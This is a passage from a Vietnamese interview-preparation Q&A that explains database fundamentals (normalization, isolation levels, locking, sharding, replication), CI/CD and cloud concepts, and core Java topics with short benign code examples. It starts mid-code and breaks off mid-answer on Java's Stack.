                .addRequestHeader("X-Request-Source", "gateway")
                .retry(config -> config.setRetries(3))
                .circuitBreaker(config -> config
                    .setName("userCB")
                    .setFallbackUri("forward:/fallback/users"))
            )
            .uri("lb://user-service"))
        .build();
}
```

---

# B. DATABASE FUNDAMENTALS & SYSTEM DESIGN

---

## Q140: Chuẩn hóa dữ liệu (1NF, 2NF, 3NF, BCNF) là gì?

Chuẩn hóa giúp giảm dư thừa dữ liệu, tránh anomaly khi insert/update/delete.

**Ví dụ trực quan theo từng mức:**

```text
Ban đầu (chưa chuẩn hóa):
order_id | customer_name | phones
1        | An            | 0901,0902   <-- 1 ô chứa nhiều giá trị
```

**1NF (atomic):**
```text
order_id | customer_name | phone
1        | An            | 0901
1        | An            | 0902
```

**2NF (loại phụ thuộc 1 phần với khóa ghép):**
```text
order_items(order_id, product_id, qty, product_name)
-- product_name chỉ phụ thuộc product_id, không phụ thuộc toàn bộ (order_id, product_id)
=> tách product_name sang products(product_id, product_name)
```

**3NF (loại phụ thuộc bắc cầu):**
```text
customers(customer_id, district_id, district_name)
-- district_name phụ thuộc district_id, không phụ thuộc trực tiếp customer_id
=> tách districts(district_id, district_name)
```

**BCNF (determinant phải là candidate key):**
```text
course, lecturer, room
Giả sử lecturer -> room (mỗi giảng viên cố định 1 phòng)
lecturer không phải key của bảng => vi phạm BCNF
=> tách thành lecturer_room + course_lecturer
```

| Mức | Mục tiêu |
|-----|----------|
| 1NF | Mỗi cột chứa giá trị nguyên tử (không list trong 1 ô) |
| 2NF | Đạt 1NF + mọi cột non-key phụ thuộc **toàn bộ** khóa chính |
| 3NF | Đạt 2NF + loại bỏ phụ thuộc bắc cầu (transitive dependency) |
| BCNF | Mọi determinant phải là candidate key |

**Trade-off:** Normalize tốt cho ghi và tính đúng đắn; đôi khi denormalize cho đọc nhanh.

---

## Q141: Isolation levels và các hiện tượng dirty/non-repeatable/phantom read?

| Isolation | Dirty Read | Non-repeatable Read | Phantom Read |
|-----------|------------|---------------------|--------------|
| Read Uncommitted | Có | Có | Có |
| Read Committed | Không | Có | Có |
| Repeatable Read | Không | Không | Có* |
| Serializable | Không | Không | Không |

- **Dirty read:** đọc dữ liệu chưa commit.
- **Non-repeatable read:** cùng 1 row đọc 2 lần ra kết quả khác.
- **Phantom read:** query cùng điều kiện nhưng số row khác nhau.

**Ví dụ trực quan:**

```text
Số dư ban đầu = 100

T1: UPDATE balance = 50 (chưa COMMIT)
T2: SELECT balance -> 50   => Dirty read (nếu read uncommitted)
T1: ROLLBACK
```

```text
Non-repeatable read:
T1: SELECT price = 100
T2: UPDATE price = 120, COMMIT
T1: SELECT lại -> 120
```

```text
Phantom read:
T1: SELECT count(*) FROM orders WHERE status='NEW' -> 10
T2: INSERT 1 order status='NEW', COMMIT
T1: SELECT lại -> 11
```

---

## Q142: Optimistic Locking vs Pessimistic Locking?

| | Optimistic | Pessimistic |
|--|------------|-------------|
| Cơ chế | Kiểm tra version khi ghi | Khóa row ngay khi đọc/ghi |
| Hiệu năng | Tốt khi ít conflict | Tốt khi conflict cao |
| Rủi ro | Retry khi conflict | Deadlock, lock wait |

```java
// Optimistic locking với JPA
@Version
private Long version;
```

```sql
-- Pessimistic locking
SELECT * FROM accounts WHERE id = 10 FOR UPDATE;
```

**Ví dụ trực quan:**

```text
Optimistic:
User A đọc profile version=5
User B đọc profile version=5
User A update thành công -> version=6
User B update với version=5 -> thất bại (OptimisticLockException)
```

```text
Pessimistic:
T1: SELECT ... FOR UPDATE (khóa row)
T2: UPDATE cùng row -> phải chờ T1 COMMIT/ROLLBACK
```

---

## Q143: Cách đọc EXPLAIN execution plan?

Mục tiêu: xác định query đang dùng index hay quét toàn bảng.

```sql
EXPLAIN ANALYZE
SELECT * FROM orders
WHERE customer_id = 1001
ORDER BY created_at DESC
LIMIT 20;
```

**Điểm cần nhìn:**
1. `type/access method`: `index seek` tốt hơn `full scan`.
2. `rows`: số dòng ước tính/đọc thực tế.
3. `cost/time`: nút nào tốn nhiều nhất.
4. `extra`: `Using filesort`, `Using temporary` thường là dấu hiệu cần tối ưu.

**Ví dụ trực quan:**

```text
Kết quả EXPLAIN (chưa tối ưu):
Seq Scan on orders  (cost=0..120000) (rows=5000000)
Filter: (customer_id = 1001)
```

```text
Sau khi tạo index orders(customer_id, created_at):
Index Scan using idx_orders_customer_created  (cost=0..120) (rows=20)
```

---

## Q144: Offset pagination vs Cursor pagination?

| | Offset | Cursor (Keyset) |
|--|--------|------------------|
| Cách làm | `LIMIT 20 OFFSET 1000` | `WHERE id < last_id LIMIT 20` |
| Ưu điểm | Dễ implement, random page | Nhanh và ổn định với data lớn |
| Nhược điểm | Chậm khi offset lớn, dễ lệch dữ liệu | Không nhảy trực tiếp page N |

**Khuyến nghị:** feed/infinite scroll nên dùng cursor.

**Ví dụ trực quan:**

```text
Data id: 100,99,98,...,1

Offset:
GET /posts?limit=3&offset=0  -> 100,99,98
GET /posts?limit=3&offset=3  -> 97,96,95
(chèn thêm record mới id=101 giữa 2 lần gọi có thể gây lệch/trùng)
```

```text
Cursor:
GET /posts?limit=3                -> 100,99,98 (next_cursor=98)
GET /posts?limit=3&cursor=98      -> 97,96,95
```

---

## Q145: Partitioning và Sharding khác nhau thế nào?

| | Partitioning | Sharding |
|--|-------------|----------|
| Phạm vi | Trong cùng 1 database instance | Nhiều database/server |
| Mục tiêu | Tối ưu quản lý/query dữ liệu lớn | Scale ngang vượt giới hạn 1 máy |
| Ví dụ | Range partition theo tháng | Shard theo `user_id % N` |

**Lưu ý:** shard key chọn sai sẽ gây hotspot và khó re-balance.

**Ví dụ trực quan:**

```text
Partitioning (1 DB):
events_2026_01
events_2026_02
events_2026_03
```

```text
Sharding (nhiều DB):
Shard-0: user_id % 2 = 0
Shard-1: user_id % 2 = 1
```

---

## Q146: Replication Primary-Replica và failover?

- **Ưu điểm:** tăng thông lượng đọc, hỗ trợ HA.
- **Vấn đề thực tế:** replication lag -> dữ liệu đọc có thể trễ.
- **Failover:** cần cơ chế health check + promote replica + cập nhật routing.

**Ví dụ trực quan:**

```text
10:00:00  ghi order #500 vào Primary
10:00:01  client đọc từ Replica -> chưa thấy #500 (lag 1s)
10:00:02  Replica bắt kịp -> đọc thấy #500
```

```text
Failover:
Primary down -> health check fail
Replica A promote thành Primary mới
App/router cập nhật endpoint write -> Primary mới
```

---

## Q147: Soft Delete, Hard Delete và Audit Trail?

| Kiểu | Cách làm | Khi dùng |
|------|----------|----------|
| Hard delete | `DELETE` vật lý khỏi bảng | Dữ liệu tạm/thấp ràng buộc pháp lý |
| Soft delete | cập nhật `deleted_at/is_deleted` | cần khôi phục, cần lịch sử |
| Audit trail | bảng log thay đổi (ai, khi nào, gì) | compliance, forensic |

**Best practice:** soft delete + index cho `deleted_at` và lọc mặc định `WHERE deleted_at IS NULL`.

**Ví dụ trực quan:**

```sql
-- Soft delete
UPDATE users SET deleted_at = NOW() WHERE id = 10;

-- Restore
UPDATE users SET deleted_at = NULL WHERE id = 10;
```

```text
audit_logs:
id | entity | entity_id | action | actor | at
1  | user   | 10        | DELETE | admin | 2026-05-08 14:00
```

---

## Q148: Thiết kế constraints: PK, FK, UNIQUE, CHECK?

```sql
CREATE TABLE users (
  id BIGSERIAL PRIMARY KEY,
  email VARCHAR(255) NOT NULL UNIQUE,
  age INT CHECK (age >= 0),
  role VARCHAR(20) CHECK (role IN ('USER','ADMIN'))
);
```

- **PK:** định danh duy nhất mỗi row.
- **FK:** đảm bảo quan hệ tham chiếu.
- **UNIQUE:** ngăn dữ liệu trùng.
- **CHECK:** enforce business rule ở mức DB.

**Ví dụ trực quan:**

```sql
-- Lỗi FK: order tham chiếu user không tồn tại
INSERT INTO orders(user_id, total_amount) VALUES (9999, 120000);
-- => foreign key violation

-- Lỗi CHECK:
INSERT INTO users(email, age, role) VALUES ('a@mail.com', -1, 'USER');
-- => check constraint violation
```

---

## Q149: Mô hình dữ liệu cho time-series và event log?

**Time-series:**
- Partition theo thời gian (day/month).
- Chỉ số chính: `(metric_id, timestamp)`.
- Có retention policy (xóa hoặc archive dữ liệu cũ).

**Event log (append-only):**
- Không update bản ghi cũ, chỉ append event mới.
- Có version/schema evolution cho event payload.
- Dễ replay để rebuild read model.

**Ví dụ trực quan:**

```text
time_series_cpu:
metric_id | ts                  | value
cpu-01    | 2026-05-08 14:00:00 | 62.1
cpu-01    | 2026-05-08 14:01:00 | 59.8
```

```text
order_events (append-only):
event_id | order_id | type         | at
e1       | 500      | OrderCreated | 14:00
e2       | 500      | OrderPaid    | 14:01
e3       | 500      | OrderShipped | 14:20
```

---

## Q150: Denormalization và Materialized View?

Denormalization là chấp nhận dư thừa dữ liệu để giảm JOIN và tăng tốc đọc.

```sql
CREATE MATERIALIZED VIEW mv_daily_sales AS
SELECT order_date::date AS day, SUM(amount) AS total_amount
FROM orders
GROUP BY order_date::date;
```

```sql
REFRESH MATERIALIZED VIEW CONCURRENTLY mv_daily_sales;
```

**Phù hợp:** dashboard/reporting read-heavy.

**Ví dụ trực quan:**

```text
Không denormalize:
Dashboard phải JOIN orders + order_items + payments mỗi lần mở trang
```

```text
Có materialized view:
mv_daily_sales(day=2026-05-08, total_amount=1_250_000_000)
Dashboard đọc trực tiếp 1 bảng tổng hợp -> nhanh hơn
```

---

## Q151: Backup/Restore và Point-in-Time Recovery (PITR)?

```text
Mục tiêu: khôi phục đúng thời điểm mong muốn, không chỉ "bản backup gần nhất".
```

**Phải có drill định kỳ:** backup không test restore = chưa an toàn.

**Ví dụ trực quan:**

```text
00:00 Full backup
10:15 Lỡ DELETE nhầm
10:20 Bắt đầu recovery
Restore full backup + replay WAL/binlog tới 10:14:59
=> dữ liệu quay về ngay trước thời điểm lỗi
```

---

## Q152: Multi-tenant database patterns?

| Mô hình | Ưu điểm | Nhược điểm |
|---------|---------|------------|
| Shared DB, Shared Schema | Rẻ, đơn giản | Isolation thấp |
| Shared DB, Separate Schema | Isolation tốt hơn | Quản trị schema phức tạp |
| Separate DB per tenant | Isolation cao nhất | Chi phí vận hành cao |

Chọn theo yêu cầu: bảo mật dữ liệu, compliance, và quy mô tenant.

**Ví dụ trực quan:**

```text
Shared schema:
orders(tenant_id, order_id, ...)
tenant A và B nằm chung bảng
```

```text
Separate schema:
tenant_a.orders
tenant_b.orders
```

```text
Separate DB:
db_tenant_a
db_tenant_b
```

---

## Q153: Outbox Pattern và CDC trong microservices?

Mục tiêu: tránh mất đồng bộ giữa DB transaction và message broker.

**Lợi ích:** giảm rủi ro "DB commit thành công nhưng publish thất bại".

**Ví dụ trực quan:**

```sql
BEGIN;
INSERT INTO orders(id, status) VALUES (500, 'CREATED');
INSERT INTO outbox_events(id, aggregate_id, event_type, payload, status)
VALUES (9001, 500, 'OrderCreated', '{...}', 'NEW');
COMMIT;
```

```text
CDC đọc outbox_events(status=NEW) -> publish Kafka -> update status=SENT
Consumer xử lý idempotent theo event_id=9001
```

---

## Q154: Chiến lược sinh ID: AUTO_INCREMENT, UUID, Snowflake?

| ID | Ưu điểm | Nhược điểm |
|----|---------|------------|
| AUTO_INCREMENT | Đơn giản, tuần tự | Khó scale đa node |
| UUID | Dễ tạo phân tán | index lớn, locality kém |
| Snowflake | Unique phân tán + gần tuần tự | cần service/phối hợp clock |

**Gợi ý:** hệ phân tán lớn thường chọn Snowflake hoặc UUIDv7.

**Ví dụ trực quan:**

```text
AUTO_INCREMENT: 1001, 1002, 1003 (đẹp, tuần tự, dễ đọc)
UUIDv4: 550e8400-e29b-41d4-a716-446655440000 (ngẫu nhiên)
Snowflake: 1913228231874512896 (tăng dần gần thời gian)
```

```text
Use case:
Monolith 1 DB -> AUTO_INCREMENT
Distributed nhiều node -> Snowflake/UUIDv7
```

---

# C. CI/CD & CLOUD FUNDAMENTALS

---

## Q155: CI vs CD khác nhau thế nào?

- **CI (Continuous Integration):** Dev merge code thường xuyên, pipeline tự build + test để phát hiện lỗi sớm.
- **CD (Continuous Delivery/Deployment):**
  - **Delivery:** sẵn sàng release, cần approve thủ công trước production.
  - **Deployment:** tự động deploy thẳng production khi pass pipeline.

**Ví dụ trực quan:**

```text
Push code -> CI chạy unit test + lint
Pass -> tạo artifact
CD Delivery: chờ nút "Approve deploy prod"
CD Deployment: tự deploy prod luôn
```

---

## Q156: Pipeline CI/CD mẫu cho backend app?

Một pipeline tối thiểu thường gồm: checkout -> build -> test -> package -> deploy.

**Ví dụ trực quan (GitHub Actions):**

```yaml
name: ci-cd
on: [push]
jobs:
  build-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - run: npm ci
      - run: npm run build
  deploy-staging:
    needs: build-test
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploy to staging"
```

---

## Q157: Deployment strategies: Rolling, Blue-Green, Canary?

| Strategy | Cách chạy | Ưu điểm | Nhược điểm |
|----------|-----------|---------|------------|
| Rolling | thay pod/server từng phần | tiết kiệm tài nguyên | rollback có thể chậm |
| Blue-Green | 2 môi trường song song (blue/green) | rollback nhanh | tốn gấp đôi tài nguyên |
| Canary | route % traffic nhỏ sang bản mới | giảm rủi ro release | cần routing/observability tốt |

**Ví dụ trực quan:**

```text
Canary:
v1 nhận 95% traffic
v2 nhận 5% traffic -> theo dõi error rate
ổn định -> tăng 25% -> 50% -> 100%
```

---

## Q158: Infrastructure as Code (IaC) với Terraform là gì?

IaC là quản lý hạ tầng bằng code để version-control, review, và tái tạo môi trường nhất quán.

**Ví dụ trực quan:**

```hcl
resource "aws_instance" "app" {
  ami           = "ami-123456"
  instance_type = "t3.micro"
}
```

```text
terraform plan  -> xem thay đổi
terraform apply -> áp thay đổi
```

---

## Q159: Docker và Kubernetes vai trò khác nhau thế nào?

- **Docker:** đóng gói app thành container.
- **Kubernetes:** điều phối nhiều containers (scale, self-healing, rolling update).

**Ví dụ trực quan:**

```text
Docker:
1 container app chạy trên 1 VM

Kubernetes:
Deployment replicas=3
pod chết -> tự tạo pod mới
```

---

## Q160: IaaS, PaaS, SaaS khác nhau ra sao?

| Mô hình | Bạn quản lý | Provider quản lý | Ví dụ |
|---------|-------------|------------------|-------|
| IaaS | app, runtime, OS | compute/network/storage | AWS EC2 |
| PaaS | app code | runtime + OS + hạ tầng | Heroku, Render |
| SaaS | chỉ sử dụng phần mềm | toàn bộ stack | Gmail, Notion |

**Ví dụ trực quan:**

```text
IaaS: tự SSH vào VM cài app
PaaS: git push là chạy
SaaS: chỉ tạo tài khoản và dùng
```

---

## Q161: Auto Scaling và Load Balancing trên cloud hoạt động thế nào?

- **Load Balancer:** phân phối request tới nhiều instance khỏe.
- **Auto Scaling:** tự tăng/giảm số instance theo CPU/RPS/queue length.

**Ví dụ trực quan:**

```text
CPU > 70% trong 5 phút -> scale từ 2 lên 4 instances
CPU < 30% trong 10 phút -> scale xuống 2 instances
LB chỉ route traffic vào instance pass health check
```

### Q162: JDK vs JRE vs JVM khác nhau như thế nào?

**Trả lời:**

| Thành phần | Mô tả | Mục đích |
|---|---|---|
| JVM | Java Virtual Machine, thực thi bytecode `.class` | Chạy ứng dụng Java theo nguyên tắc **WORA** (Write Once, Run Anywhere) |
| JRE | JVM + thư viện chuẩn (`java.*`) + runtime components | Cung cấp môi trường để **chạy** ứng dụng Java |
| JDK | JRE + công cụ phát triển (`javac`, `jdb`, `jar`, `javadoc`) | Cung cấp đầy đủ để **phát triển, build, debug** ứng dụng Java |

```text
JDK ⊃ JRE ⊃ JVM
```

---

### Q163: Có những loại biến nào trong Java?

**Trả lời:**

Trong Java thường gặp 4 loại biến:

1. **Local variable**: khai báo trong method/block, **không có default value**, bắt buộc gán trước khi dùng.
2. **Instance variable**: field non-static của object, mỗi object có bản riêng, có default value.
3. **Static variable**: field cấp class, dùng chung cho mọi object.
4. **Constant**: dùng `final`, không đổi sau khi khởi tạo.

```java
public class Employee {
    // Instance variable (mỗi object 1 bản)
    private String name; // default: null

    // Static variable (shared toàn class)
    private static int totalEmployees = 0;

    // Constant
    private static final String COMPANY_CODE = "BANKING_CORE";

    public Employee(String name) {
        this.name = name;
        totalEmployees++;
    }

    public void printInfo() {
        // Local variable (phải init trước khi dùng)
        int yearlyBonus = 1200;
        System.out.println(name + " - bonus: " + yearlyBonus);
    }
}
```

---

### Q164: Constructor là gì? Khác Method thông thường như thế nào?

**Trả lời:**

**Constructor** là hàm đặc biệt dùng để khởi tạo object tại thời điểm `new`.

| Tiêu chí | Constructor | Method thường |
|---|---|---|
| Return type | Không có (kể cả `void`) | Bắt buộc có kiểu trả về hoặc `void` |
| Tên | Phải trùng tên class | Tùy ý |
| Khi gọi | Tự động khi `new` object | Gọi tường minh |
| Mục đích | Khởi tạo trạng thái ban đầu | Xử lý nghiệp vụ |

```java
public class Car {
    private String model;
    private int year;

    // Default constructor
    public Car() {
        this("Unknown", 2024); // constructor chaining
    }

    // Overloaded constructor
    public Car(String model, int year) {
        this.model = model;
        this.year = year;
    }

    public String info() { // normal method
        return model + " - " + year;
    }
}
```

Ngoài ra có:
- **Default constructor** (compiler tạo khi bạn không khai báo constructor nào).
- **Overloading constructor** (nhiều constructor khác tham số).
- Chaining qua `this(...)`.

---

### Q165: `static` keyword? Static block vs static method?

**Trả lời:**

`static` áp dụng cho:

1. **Static variable**: dữ liệu dùng chung cho class.
2. **Static method**: gọi bằng tên class, không cần tạo object.
3. **Static block**: chạy 1 lần khi class được load.
4. **Static nested class**: class lồng không giữ tham chiếu tới outer instance.

| Tiêu chí | Static block | Static method |
|---|---|---|
| Thời điểm thực thi | Tự chạy khi class load | Chạy khi được gọi |
| Mục đích | Init dữ liệu static phức tạp | Cung cấp utility/class behavior |
| Tham số | Không nhận tham số | Có thể nhận tham số |
| Tái sử dụng | Không gọi lại trực tiếp | Gọi lại nhiều lần |

```java
public class Counter {
    private static int totalRequests;

    static {
        // Run once when class is loaded
        totalRequests = 1000;
        System.out.println("Counter initialized");
    }

    public static void increment() {
        totalRequests++;
    }

    public static int getTotalRequests() {
        return totalRequests;
    }

    public static class Metrics {
        public static String source() {
            return "API_GATEWAY";
        }
    }
}
```

---

### Q166: `this` vs `super` keyword?

**Trả lời:**

- `this` dùng để tham chiếu object hiện tại (field/method của class hiện tại).
- `super` dùng để truy cập thành phần class cha.

```java
class Animal {
    protected String name;

    Animal(String name) {
        this.name = name;
    }
}

class Dog extends Animal {
    private String name;

    Dog(String parentName, String dogName) {
        super(parentName); // call parent constructor
        this.name = dogName; // this: current class field
    }

    void printNames() {
        System.out.println("Dog name: " + this.name);
        System.out.println("Animal name: " + super.name); // access shadowed parent field
    }
}
```

`this(...)` dùng để gọi constructor khác trong cùng class.  
`super(...)` dùng để gọi constructor class cha.

⚠️ `this()` và `super()` phải là statement **đầu tiên** trong constructor, và không dùng cùng lúc trong một constructor.

---

### Q167: `final` keyword dùng để làm gì?

**Trả lời:**

`final` có 3 cách dùng chính:

1. **Final variable**: không thể gán lại.
2. **Final method**: không thể override ở class con.
3. **Final class**: không thể kế thừa (ví dụ `String`, `Integer`).

```java
final class AccountTypeRegistry {
    public static final String SAVINGS = "SAVINGS"; // final variable
}

class BaseService {
    public final void audit() { // final method
        System.out.println("Audit log");
    }
}

class TransferService extends BaseService {
    // cannot override audit()
}
```

⚠️ `final List<String> list = new ArrayList<>();` nghĩa là **reference cố định**, nhưng nội dung list vẫn sửa được:

```java
final List<String> list = new ArrayList<>();
list.add("TXN-001"); // still valid
```

---

### Q168: Anonymous class là gì? Khi nào nên dùng?

**Trả lời:**

**Anonymous class** là class không tên, được định nghĩa và khởi tạo ngay tại chỗ.

Dùng khi:
- Chỉ cần implement interface/abstract class **một lần**.
- Viết callback/event handler nhanh.

```java
// Runnable anonymous class
Runnable job = new Runnable() {
    @Override
    public void run() {
        System.out.println("Process user notification");
    }
};

// Comparator anonymous class
Comparator<String> byLength = new Comparator<String>() {
    @Override
    public int compare(String a, String b) {
        return Integer.compare(a.length(), b.length());
    }
};
```

So với lambda:
- **Lambda** gọn hơn cho functional interface (1 abstract method).
- **Anonymous class** linh hoạt hơn khi cần thêm state hoặc nhiều method helper.

---

### Q169: Array vs ArrayList khác nhau như thế nào?

**Trả lời:**

| Tiêu chí | Array | ArrayList |
|---|---|---|
| Kích thước | Cố định sau khi tạo | Tăng/giảm động |
| Kiểu data | Hỗ trợ primitive + object | Chỉ object (dùng wrapper cho primitive) |
| Hiệu suất truy cập | Rất nhanh theo index | Nhanh, nhưng có overhead object |
| Bộ nhớ | Gọn hơn | Tốn thêm cho capacity growth |
| Linh hoạt | Thấp | Cao |
| API | Cơ bản | Phong phú (`add`, `remove`, `contains`, ...) |

```java
int[] fixedScores = new int[3];
fixedScores[0] = 90;

List<Integer> dynamicScores = new ArrayList<>();
dynamicScores.add(90);
dynamicScores.add(95);
dynamicScores.remove(0);
```

Nên dùng:
- **Array**: dữ liệu cố định, cần hiệu năng cao với primitive.
- **ArrayList**: dữ liệu thay đổi thường xuyên, cần API tiện.

---

### Q170: Comparator vs Comparable khác nhau? Khi nào dùng cái nào?

**Trả lời:**

| Tiêu chí | Comparable | Comparator |
|---|---|---|
| Method | `compareTo()` | `compare()` |
| Mục tiêu | Thứ tự tự nhiên | Thứ tự tùy biến |
| Vị trí viết | Trong class gốc | Class riêng hoặc lambda |
| Ảnh hưởng class gốc | Phải sửa class | Không cần sửa class |

```java
public class Person implements Comparable<Person> {
    private String name;
    private int age;

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() { return name; }
    public int getAge() { return age; }

    @Override
    public int compareTo(Person other) {
        return Integer.compare(this.age, other.age); // natural order by age
    }
}

Comparator<Person> byName = Comparator.comparing(Person::getName);
```

Dùng:
- **Comparable** khi muốn định nghĩa thứ tự mặc định ổn định.
- **Comparator** khi cần nhiều cách sort khác nhau theo context.

---

### Q171: Encapsulation chi tiết — vai trò của `private`?

**Trả lời:**

**Encapsulation** là đóng gói data + behavior, đồng thời ẩn dữ liệu nội bộ để bảo vệ invariant.

Pattern phổ biến:
- Field để `private`.
- Expose qua getter/setter có validate.

```java
public class BankAccount {
    private String accountNo;
    private double balance;

    public BankAccount(String accountNo, double balance) {
        this.accountNo = accountNo;
        setBalance(balance);
    }

    public double getBalance() {
        return balance;
    }

    public void setBalance(double balance) {
        if (balance < 0) {
            throw new IllegalArgumentException("Balance must be >= 0");
        }
        this.balance = balance;
    }
}
```

Lợi ích:
- Bảo vệ dữ liệu khỏi cập nhật sai.
- Dễ refactor logic internal mà không phá API public.
- Dễ kiểm soát điểm vào của dữ liệu để debug và audit.

---

### Q172: Tính năng nổi bật của Java so với ngôn ngữ khác?

**Trả lời:**

1. **Platform independence (WORA):** compile ra bytecode, chạy trên JVM nhiều OS.
2. **Garbage Collection:** tự động quản lý bộ nhớ, giảm memory leak thủ công.
3. **Bảo mật tốt:** classloader, sandboxing, access control giúp hạn chế code độc.
4. **Tư duy OOP mạnh:** class/object, inheritance, polymorphism (dù có primitive).
5. **Multithreading built-in:** `Thread`, `ExecutorService`, `CompletableFuture`.
6. **Thư viện chuẩn rộng + ecosystem lớn:** hỗ trợ web, IO, networking, concurrency.
7. **Strongly typed:** compile-time check giúp giảm lỗi runtime.

---

### Q173: Custom Exception — tại sao và khi nào nên tạo?

**Trả lời:**

Nên tạo **Custom Exception** khi:
- Cần thông điệp lỗi nghiệp vụ rõ ràng hơn lỗi hệ thống chung.
- Muốn phân loại lỗi để catch/handle đúng loại.
- Muốn mapping chuẩn giữa exception và HTTP/business error code.

Bạn có thể:
- `extends Exception` (checked) khi bắt buộc caller xử lý.
- `extends RuntimeException` (unchecked) cho lỗi business/runtime phổ biến.

```java
public class InsufficientBalanceException extends RuntimeException {
    public InsufficientBalanceException(String message) {
        super(message);
    }

    public InsufficientBalanceException(String message, Throwable cause) {
        super(message, cause);
    }
}

class TransferService {
    public void transfer(double amount, double currentBalance) {
        if (amount > currentBalance) {
            throw new InsufficientBalanceException("Not enough balance for transfer");
        }
    }
}
```

Best practice:
- Tên kết thúc bằng `Exception`.
- Có constructor `(String msg)` và `(String msg, Throwable cause)`.
- Thường ưu tiên unchecked cho lỗi nghiệp vụ ở service layer.

---

### Q174: Nếu `finally` block có `return`, kết quả ra sao?

**Trả lời:**

`return` trong `finally` sẽ **ghi đè** `return` ở `try/catch`.

```java
public int demo() {
    try {
        return 1;
    } catch (Exception e) {
        return 2;
    } finally {
        return 3; // overrides previous return
    }
}
// result: 3
```

⚠️ Đây là **anti-pattern**: dễ gây khó hiểu và có thể "nuốt" exception.  
Best practice: `finally` chỉ dùng để cleanup (đóng resource), không thay đổi control flow.

---

### Q175: NullPointerException là gì? Các cách phòng tránh?

**Trả lời:**

`NullPointerException` xảy ra khi truy cập method/field của reference đang `null`.

6 cách phòng tránh:

1. Check `!= null` trước khi truy cập.
2. Dùng `Optional<T>` cho dữ liệu có thể vắng mặt.
3. Khởi tạo default object/value thay vì để null.
4. Dùng annotation `@NonNull` / `@Nullable` để rõ contract.
5. Dùng `Objects.requireNonNull()` ở đầu method.
6. Viết `"CONST".equals(var)` thay vì `var.equals("CONST")`.

```java
Optional<User> userOpt = userRepository.findById(userId);
String email = userOpt
        .map(User::getEmail)
        .orElse("unknown@domain.com");
```

---

### Q176: `wait()` vs `sleep()` trong multithreading?

**Trả lời:**

| Tiêu chí | `wait()` | `sleep()` |
|---|---|---|
| Thuộc class nào | `Object` | `Thread` |
| Giải phóng lock | Có | Không |
| Cần synchronized | Có (phải gọi trong monitor) | Không bắt buộc |
| Cách wake up | `notify()` / `notifyAll()` hoặc timeout | Hết timeout hoặc interrupt |

```java
class QueueProcessor {
    private final Object lock = new Object();
    private boolean ready = false;

    public void consume() throws InterruptedException {
        synchronized (lock) {
            while (!ready) {
                lock.wait(); // releases monitor and waits
            }
        }
    }

    public void produce() {
        synchronized (lock) {
            ready = true;
            lock.notifyAll();
        }
    }
}

// Simple delay
Thread.sleep(1000);
```

Dùng:
- `wait/notify` cho giao tiếp giữa các thread.
- `sleep` để delay tạm thời.

---

### Q177: `map` vs `flatMap` trong Stream API?

**Trả lời:**

| Toán tử | Ý nghĩa | Dạng chuyển đổi |
|---|---|---|
| `map` | 1 phần tử -> 1 phần tử mới | `Stream<T>` -> `Stream<R>` |
| `flatMap` | 1 phần tử -> nhiều phần tử, rồi flatten | `Stream<T>` -> `Stream<R>` từ `Stream<Stream<R>>` |

```java
List<String> usernames = List.of("anna", "bob");
List<Integer> lengths = usernames.stream()
        .map(String::length) // map: 1-to-1
        .toList();

class Order {
    private List<OrderItem> items;
    public List<OrderItem> getItems() { return items; }
}

List<Order> orders = orderService.findByUserId("U1001");
List<OrderItem> allItems = orders.stream()
        .flatMap(order -> order.getItems().stream()) // flatten nested lists
        .toList();
```

---

### Q178: Lazy evaluation trong Stream API là gì?

**Trả lời:**

Các intermediate operations (`map`, `filter`, `flatMap`, `peek`) không chạy ngay.  
Chúng chỉ thực thi khi có terminal operation như `collect`, `count`, `forEach`, `reduce`.

Lợi ích:
- Tránh làm việc thừa.
- Hỗ trợ short-circuit (`findFirst`, `anyMatch`) để dừng sớm.

```java
List<String> users = List.of("alice", "bob", "charlie");

Stream<String> pipeline = users.stream()
        .peek(u -> System.out.println("peek source: " + u))
        .filter(u -> u.length() > 3)
        .peek(u -> System.out.println("after filter: " + u));

System.out.println("No terminal op yet"); // nothing printed from peek

List<String> result = pipeline.collect(Collectors.toList()); // now pipeline executes
```

---

### Q179: `parallelStream` — khi nào nên/không nên dùng?

**Trả lời:**

`parallelStream` chia dữ liệu thành nhiều chunk và xử lý song song qua `ForkJoinPool`.

✅ Nên dùng khi:
- Dataset lớn.
- Mỗi phần tử xử lý độc lập.
- Tác vụ tính toán nặng, CPU-bound.
- Máy có nhiều core.

❌ Không nên dùng khi:
- Dataset nhỏ (overhead lớn hơn lợi ích).
- Có side effect/shared mutable state.
- Cần giữ thứ tự nghiêm ngặt.
- Đang trong web request và dùng common pool dễ ảnh hưởng request khác.

```java
List<Order> orders = orderService.findLargeBatch();

double total = orders.parallelStream()
        .mapToDouble(Order::getTotalAmount)
        .sum();
```

⚠️ Hãy đảm bảo collector/thread-safety: dùng collector chuẩn (`Collectors.toList()`, `summingDouble`) và tránh mutate shared object từ nhiều thread.

---

### Q180: `findAny()` vs `findFirst()` khác nhau?

**Trả lời:**

- `findFirst()`: trả phần tử **đầu tiên** theo encounter order.
- `findAny()`: trả phần tử bất kỳ, không đảm bảo thứ tự.

Trong sequential stream, kết quả thường giống nhau.  
Trong parallel stream, `findAny()` có thể nhanh hơn vì không cần chờ thread giữ phần tử đầu.

Cả hai đều trả về `Optional<T>`.

```java
Optional<User> firstPremium = users.stream()
        .filter(User::isPremium)
        .findFirst();

Optional<User> anyPremium = users.parallelStream()
        .filter(User::isPremium)
        .findAny();
```

---

### Q181: Default & Static methods trong Interface (Java 8+)?

**Trả lời:**

- **Default method**: có thân hàm trong interface, class implement có thể override hoặc dùng mặc định.
- **Static method**: method tĩnh của interface, gọi qua `InterfaceName.method()`, không inherit xuống class.

```java
interface AuditLogger {
    default String format(String action) {
        return "[AUDIT] " + action;
    }

    static String now() {
        return Instant.now().toString();
    }
}

interface CsvExporter {
    default String format(String action) {
        return "csv:" + action;
    }
}

class UserService implements AuditLogger, CsvExporter {
    @Override
    public String format(String action) {
        // Resolve diamond default method conflict
        return AuditLogger.super.format(action) + " at " + AuditLogger.now();
    }
}
```

Use case thực tế:
- `Comparator.reversed()` là **default method**.
- `Comparator.comparing()` là **static method**.

---

### Q182: Stack trong Java là gì?

**Trả lời:**

**Stack** là cấu trúc dữ liệu theo nguyên tắc **LIFO** (Last In, First Out): vào sau ra trước.

Các thao tác chính:
- `push(x)`: thêm phần tử lên đỉnh.
